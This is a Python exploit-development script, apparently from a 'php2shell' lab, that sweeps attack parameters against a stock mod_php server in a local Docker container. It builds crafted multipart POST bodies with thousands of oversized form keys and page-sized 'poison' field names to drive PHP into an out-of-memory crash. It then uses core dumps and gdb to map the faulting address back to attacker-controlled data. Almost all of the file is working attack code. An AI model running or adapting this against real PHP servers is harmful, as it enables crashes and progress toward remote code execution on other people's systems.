#!/usr/bin/env python3
"""oom63: REAL-KNOB sweep on pure stock mod_php.

Lesson from oom62: allocations round to 4KB pages; sweeping NAMELEN by
±600B was a null knob (same page count every variant -> same geometry).

Real knobs:
  A) poison-name page count P: namelen = P*4096-25 (exactly P pages), P 30..52
     (40 = the instrument-tuned value)
  B) lead-in key count k1 (2044 instrument-tuned): sweep 1024..3584
Diagnostic per fire: count of "Allowed memory size" lines (did we even hit
the OOM path?) + segv delta + cores.
Distinct stamp_base per fire; on hit: core -> gdb si_addr -> cell index.
"""
import re
import subprocess
import time
import urllib.request

LAB = "http://127.0.0.1:8081"
LIB = "/usr/lib/apache2/modules/libphp.so"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
PHPLAB = "/Users/vlad/Projects/queue/php2shell-lab"
HEXD = b"0123456789abcdef"
KEYLEN = 3064
PREP = 3


def sh(cmd, timeout=25, retries=2):
    for _ in range(retries + 1):
        try:
            r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                               capture_output=True, timeout=timeout)
            return (r.stdout.decode("latin1") + r.stderr.decode("latin1")[:150]).strip()
        except subprocess.TimeoutExpired:
            time.sleep(1)
    return "<<EXEC TIMEOUT>>"


def dcp(src, dst):
    return subprocess.run(["docker", "cp", src, dst], capture_output=True).returncode


def key_part(i):
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (KEYLEN - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    return head + b"v\r\n"


def poison_part(namelen, n, stamp_offset):
    total = namelen - 1 - 6
    ncells = total // 16
    pad = total - ncells * 16
    idx = stamp_offset
    body = bytearray()
    for _ in range(ncells):
        stamp = bytes([HEXD[(idx >> (4 * (5 - k))) & 0xF] for k in range(6)])
        body += stamp + b"z" * 10
        idx += 1
    body += b"p" * pad
    nm = b"q" + bytes(body) + (b"%06d" % n)
    assert len(nm) == namelen, (len(nm), namelen)
    return b'--BOUND\r\nContent-Disposition: form-data; name="' + nm + b'"\r\n\r\nv\r\n'


def build_attack(namelen, k1, stamp_base, total_keys=4200):
    ps = [key_part(i) for i in range(k1)]
    ps += [poison_part(namelen, n, stamp_base + n * 20000) for n in range(PREP)]
    ps += [key_part(i) for i in range(k1, total_keys)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def http(path, body=None, ctype=None, timeout=40):
    req = urllib.request.Request(LAB + path, data=body)
    if ctype:
        req.add_header("Content-Type", ctype)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return "HTTP%s" % e.code
    except Exception as e:
        return type(e).__name__


def full_logs():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return (r.stdout + r.stderr).decode("latin1", "replace")


def counts(logs):
    return (len(re.findall(r"exit signal Segmentation", logs)),
            len(re.findall(r"Allowed memory size of", logs)))


def setup():
    md5 = sh("md5sum %s | cut -d' ' -f1" % LIB, 15)
    if md5 != STOCK_MD5:
        print("[ABORT] md5=%s" % md5, flush=True)
        return False
    dcp(PHPLAB + "/oomlab.ini", "php_vuln:/usr/local/etc/php/conf.d/30-oomlab.ini")
    sh("grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars")
    sh("printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf")
    sh("rm -f /tmp/core*")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    probe = "?"
    for _ in range(25):
        time.sleep(1.5)
        probe = sh("curl -s -m 5 http://127.0.0.1/oom_sapi.php", 10, 1)
        if "lim=20600000" in probe:
            break
    print("[ini]", probe, flush=True)
    return "lim=20600000" in probe


def fire(tag, logs_state, att):
    segv0, oom0 = counts(full_logs())
    code = http("/oom_mod.php", att, "multipart/form-data; boundary=BOUND")
    time.sleep(2)
    logs = full_logs()
    segv1, oom1 = counts(logs)
    cores = sh("ls /tmp/core* 2>/dev/null | wc -l", 10)
    print("  %s: %s segv+=%d oom+=%d cores=%s"
          % (tag, code, segv1 - segv0, oom1 - oom0, cores), flush=True)
    return segv1 - segv0, cores, logs


def decode_core(tag):
    corep = sh("ls -t /tmp/core* | head -1", 10)
    if not corep.startswith("/tmp/core"):
        print("[no core]", sh("cat /proc/sys/kernel/core_pattern", 10), flush=True)
        return
    dcp("php_vuln:%s" % corep, PHPLAB + "/child.core.63")
    dcp(PHPLAB + "/libphp.so.stock", "phpbuild:/tmp/libphp.stock.so")
    dcp(PHPLAB + "/child.core.63", "phpbuild:/tmp/child.core.63")
    open("/tmp/g63.gdb", "w").write(
        "set pagination off\nbt 6\ninfo registers rip rdi rsi rax\n"
        "p $_siginfo._sifields._sigfault.si_addr\nx/2i $pc\n")
    r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                        "gdb -q -batch -x /tmp/g63.gdb /tmp/libphp.stock.so /tmp/child.core.63 2>&1 | tail -25"],
                       capture_output=True, timeout=180)
    out = r.stdout.decode("latin1", "replace")
    print(out, flush=True)
    m = re.search(r'si_addr.*?=\s*(0x[0-9a-f]+)', out)
    if m:
        raw = int(m.group(1), 16).to_bytes(8, "little")
        digits = re.findall(rb"[0-9a-f]{6}", raw)
        print("[si_addr]", raw, "digit-run(s):", digits, flush=True)
        if digits:
            cell = int(digits[-1][::-1], 16)
            print("[cell index] stamp=%s -> 0x%x = %d" % (digits[-1][::-1].decode(), cell, cell), flush=True)


def main():
    print("=== [0] stock + conditions ===", flush=True)
    if not setup():
        return
    segv_base, _ = counts(full_logs())
    print("[baseline] segv=%d" % segv_base, flush=True)

    hit = None
    print("=== [A] poison-page sweep P=30..52 step2 ===", flush=True)
    for fi, P in enumerate(range(30, 53, 2)):
        namelen = P * 4096 - 25
        att = build_attack(namelen, 2044, fi * 1000000)
        d, cores, _ = fire("P=%d(nl=%d)" % (P, namelen), None, att)
        if d > 0:
            hit = ("P=%d" % P, cores)
            break

    if not hit:
        print("=== [B] lead-in key sweep k1 ===", flush=True)
        namelen = 40 * 4096 - 25
        for fi, k1 in enumerate([1024, 1536, 2304, 2560, 3072, 3584]):
            att = build_attack(namelen, k1, 10000000 + fi * 1000000)
            d, cores, _ = fire("k1=%d" % k1, None, att)
            if d > 0:
                hit = ("k1=%d" % k1, cores)
                break

    print("=== [2] hit=%s ===" % (hit,), flush=True)
    if hit:
        decode_core(hit[0])

    print("=== [3] restore ===", flush=True)
    sh("rm -f /usr/local/etc/php/conf.d/30-oomlab.ini /etc/apache2/conf-enabled/oomcore.conf /tmp/core*")
    sh("sed -i '/ulimit -c/d' /etc/apache2/envvars")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(15):
        time.sleep(1.5)
        http("/oom_sapi.php", timeout=5)
    print("[restored]", sh("md5sum %s | cut -c1-8" % LIB, 15),
          sh("curl -s -m 5 http://127.0.0.1/oom_sapi.php", 10, 1), flush=True)
    print("=== DONE hit=%s ===" % (hit,), flush=True)


if __name__ == "__main__":
    main()
